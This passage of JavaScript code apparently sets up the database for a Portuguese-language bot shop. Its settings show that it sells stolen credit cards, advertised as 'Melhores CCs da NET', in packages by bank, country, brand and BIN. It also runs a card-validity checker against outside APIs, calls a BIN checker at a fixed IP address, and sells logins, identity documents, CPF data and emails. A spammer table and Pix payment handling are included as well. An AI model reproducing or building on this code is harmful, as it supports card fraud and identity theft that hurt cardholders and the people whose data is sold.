VALOR_PAGO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS SISTEMA 
(
PARAMETRO VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(PARAMETRO)
)`
    ).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_INICIAL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CONTATO_CRIADOR','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('QUALBINCHECKER','http://135.148.29.149:8001/BinChecker.php?lista=infobin') ON CONFLICT DO NOTHING`).run()


    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TIPOMENU_ORDEM','a') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('NOME_BOT','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_SUPORTE','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BUSCARPORBIN','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('DATA_VENCIMENTO_MS','${Date.now()}') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VALOR_SEMANA','100') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TAXA_ADESAO_STATUS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TAXA_ADESAO_VALOR','50') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MANUTENCAO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('HABILITAR_PIX_AUTO','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('HABILITAR_PIX_MANUAL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHAVE_PIX','Sem chave Pix configurada no momento...') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('INFO_PIX','Sem informações da chave pix no momento...') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MIN_RECARGA','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TOKEN_MP','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TITULO_PRODUTO','STORE') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BONUS_REGISTRO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BONUS_FOI_INDICADO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BONUS_RECARGA_PERCENTUAL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('COMISSAO_INDICACAO_RECARGA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('LIMITE_SALDO','2500') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('LIMITE_GERAR_PIX','1000') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_PIX_AUTOMATICO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_PIX_AUTO_DESATIVADO','Pix automático desabilitado temporáriamente...') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAO','2000') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MILESEGUNDOS_INTERACAO_LOOP_MANIPULACAOV2','2000') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('FUNCAO_ASSOCIADOS_PAGO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ATIVAR_ASSOCIADOS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MODO_ASSOCIADOS','2') ON CONFLICT DO NOTHING`).run()
    //MODO_ASSOCIADOS = 1 | Todos podem ser sócios.
    //MODO_ASSOCIADOS = 2 | Só você pode permitir novos sócios.
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_TORNE_ASSO','Vem ser um associado!') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_VIROU_ASSO','Agora você é um Associado!') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MODELO_DIVUL_ASSOCIADO1','Melhores CCs da NET') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MODELO_DIVUL_ASSOCIADO2','Melhores CCs da NET') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('PERCENTUAL_ASSO_GERAL','20') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BONUS_VIROU_INDICADO','8') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('PIX_OU_COMPRA','1') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_ELFO','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_ELFO','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_CC','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MODO_SAIDA_MIX','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_CC','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_CC_FULL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_CC','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_CC','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_UNIDADE_CC','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MODO_VENDA_UNIDADE','1') ON CONFLICT DO NOTHING`).run()
    //MODO_VENDA_UNIDADE = 1 | Uma opção de Unitária que mostra apenas nos niveis.
    //MODO_VENDA_UNIDADE = 2 | Várias opções de unitárias,Banco,País,Bandeira e etc.

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_MIX','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_MIX_FULL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_NIVEL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_NIVEL_FULL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BANCO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BANCO_FULL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_PAIS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_PAIS_FULL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BANDEIRA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BANDEIRA_FULL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BIN','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('VENDER_PACOTE_BIN_FULL','0') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('NOME_CPF_NA_MIX','0') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_CHECAR_ATE_LIVE','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_DIE_SECUNDARIA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('USO_APIS_CHK','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_REEMBOLSO_COMO','1') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ATIVAR_CHK','0') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('API_CHK','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('HEADER_AUTORIZATION','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE','Aprovada') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE2','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE3','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE','Reprovada') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE2','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE3','§§§§§§§§') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ATIVAR_CHK_SECUNDARIO','0') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('API_CHK_SECUNDARIO','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('HEADER_AUTORIZATION_SECUNDARIO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE_SECUNDARIO','Aprovada') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE2_SECUNDARIO','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_LIVE3_SECUNDARIO','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE_SECUNDARIO','Reprovada') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE2_SECUNDARIO','§§§§§§§§') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('CHK_PALAVRA_DIE3_SECUNDARIO','§§§§§§§§') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ATIVAR_REEMBOLSO_CHK','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('LIMITE_REEMBOLSO_CHK','10') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MINIMO_TEMPO_REEMBOLSO_CHK','10') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA','15') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('FULLDADOS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('INFOCC_NORMAL','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MANIPULAR_RETORNO_CHK_PARA_TESTES','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MANIPULAR_RETORNO_CHK_PARA_TESTES_SECUNDARIO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('OCULTARCHK','0') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_CONSULTADA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_CONSULTADA','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_CONSULTADA','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_CONSULTADA','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_CONSUL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_CONSUL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MODO_VENDA_LOGIN','1') ON CONFLICT DO NOTHING`).run()
    //MODO_VENDA_LOGIN = 1 | Ao clicar em logins, ja aparece os serviços e ao escolher um ja vai comprar qualquer um do estoque que seja do serviço escolhido.
    //MODO_VENDA_LOGIN = 2 | Interação mais detalhada, mostrará todos os serviços do estoque.
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_CONSULTAVEL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_CONSUL','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_LOGIN','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_LOGIN','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_LOGIN','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_LOGIN','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ATIVAR_LOG_LOGINVENDA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ID_FORMULARIO_LOG_LOGINVENDA','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA1','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA2','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA3','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA4','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA5','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA6','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA7','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('ENTRY_FORM_LOG_LOGINVENDA8','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_TRILHAS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_TRILHAS','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_TRILHAS','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_TRILHAS','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_LARA','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_LARA','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_LARA','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_LARA','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_DOC','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_DOC','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_DOC','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_DOC','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_CPF','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_CPF','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_CPF','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_CPF','') ON CONFLICT DO NOTHING`).run()

    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('BOT_EMAIL','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('TEXTO_MENU_EMAIL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_AO_COMPRAR_EMAIL','') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SISTEMA (PARAMETRO,VALOR) VALUES ('MENSAGEM_GRUPO_NOTIFICACOES_COMPROU_EMAIL','') ON CONFLICT DO NOTHING`).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS GIFTS 
(
COD VARCHAR(32),
VALOR VARCHAR(32),
USADO VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_QUE_USOU VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PIX_COPIA_COLA 
(
ID_PAGAMENTO VARCHAR(32) NOT NULL DEFAULT '0',
CHAVE_PIX_COP_COL VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_QUEM_GEROU VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PROCESSADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_INSERIDO_MS VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PAGAMENTO_BOT_PIX
(
ID_PAGAMENTO VARCHAR(32) NOT NULL DEFAULT '0',
SEMANAS VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
CHAVE_PIX_COP_COL VARCHAR(32) NOT NULL DEFAULT '0',
DATA_ANTERIOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_NOVA VARCHAR(32) NOT NULL DEFAULT '0',
PROCESSADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_INSERIDO_MS VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS SPAMMER 
(
PARAMETRO VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(PARAMETRO)
)`
    ).run()
    DataBase_Better.prepare(`INSERT INTO SPAMMER (PARAMETRO,VALOR) VALUES ('ATIVADO','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SPAMMER (PARAMETRO,VALOR) VALUES ('TEXTO_ENVIAR','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SPAMMER (PARAMETRO,VALOR) VALUES ('INTERVALO_ENVIO_SEGUNDOS','0') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO SPAMMER (PARAMETRO,VALOR) VALUES ('ULTIMO_ENVIO_MS','0') ON CONFLICT DO NOTHING`).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS GRUPOS_DETECTAR
(
ID_GRUPO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS NOTIFICACOES_GRUPOS 
(
PARAMETRO VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(PARAMETRO)
)`
    ).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('ATIVAR_NOTIFICACOES','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_REGISTRO','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_ADD_SALDO','1') ON CONFLICT DO NOTHING`).run()
